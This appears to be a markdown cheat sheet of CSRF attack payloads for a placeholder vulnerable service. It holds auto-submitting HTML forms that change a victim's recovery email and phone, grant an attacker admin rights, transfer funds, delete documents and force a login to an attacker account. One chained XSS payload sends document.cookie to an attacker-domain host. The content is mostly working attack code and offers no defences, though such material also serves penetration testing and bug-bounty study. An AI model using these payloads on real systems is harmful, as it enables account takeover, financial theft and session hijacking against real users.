# CSRF (Cross-Site Request Forgery)

## Table of Contents
- [Account Takeover](#account-takeover)
- [Privilege Escalation](#privilege-escalation)
- [Financial Loss](#financial-loss)
- [Data Tampering](#data-tampering)
- [Chaining with XSS](#chaining-with-xss)
- [Login CSRF](#login-csrf)

## Account Takeover

### An attacker can take over the account by redirecting the recovery path to a resource they control.

- Changing the victim's email address [^1]
    ```html
    <form action="https://[VULNERABLE-SERVICE]/account/email" method="POST">
        <input type="hidden" name="email" value="attacker@[ATTACKER-DOMAIN]">
    </form>
    <script>
        document.forms[0].submit()
    </script>
    ```
    The attacker then requests a password reset, which is delivered to their own address.

- Registering an attacker-controlled recovery factor
    ```html
    <form action="https://[VULNERABLE-SERVICE]/account/phone" method="POST">
        <input type="hidden" name="phone" value="[ATTACKER-PHONE]">
    </form>
    <script>
        document.forms[0].submit()
    </script>
    ```

## Privilege Escalation

### A forged request is executed with the permissions of the user who triggers it.

- Granting the attacker an administrative role
    ```html
    <!-- Delivered to a user who already holds administrative permissions -->
    <form action="https://[VULNERABLE-SERVICE]/admin/members" method="POST">
        <input type="hidden" name="email" value="attacker@[ATTACKER-DOMAIN]">
        <input type="hidden" name="role" value="admin">
    </form>
    <script>
        document.forms[0].submit()
    </script>
    ```

## Financial Loss

### Transactions can be carried out with the victim's stored funds or payment methods.

- Making a transfer
    ```html
    <form action="https://[VULNERABLE-SERVICE]/transfer" method="POST">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="1000">
    </form>
    <script>
        document.forms[0].submit()
    </script>
    ```

## Data Tampering

### The victim's data can be modified or destroyed without their interaction.

- Deleting the victim's resources
    ```html
    <form action="https://[VULNERABLE-SERVICE]/documents/1234/delete" method="POST">
    </form>
    <script>
        document.forms[0].submit()
    </script>
    ```

## Chaining with XSS

### Self-targeted XSS may escalate into an issue that affects other users, because the payload is stored on the victim's own account.

- Storing an XSS payload in the victim's profile
    ```html
    <form action="https://[VULNERABLE-SERVICE]/profile" method="POST">
        <input type="hidden" name="nickname" value="<img src=x onerror=fetch('https://[ATTACKER-DOMAIN]/?c='+document.cookie)>">
    </form>
    <script>
        document.forms[0].submit()
    </script>
    ```

## Login CSRF

### The victim can be signed into an account the attacker controls, so activity the victim believes is private is recorded under that account.

- Forcing authentication as the attacker
    ```html
    <form action="https://[VULNERABLE-SERVICE]/login" method="POST">
        <input type="hidden" name="username" value="attacker">
        <input type="hidden" name="password" value="attacker_password">
    </form>
    <script>
        document.forms[0].submit()
    </script>
    ```
    Search history, uploaded files, and any payment method the victim registers afterwards remain accessible to the attacker.

[^1]: Applies when the endpoint does not require the current password or a re-authentication step.
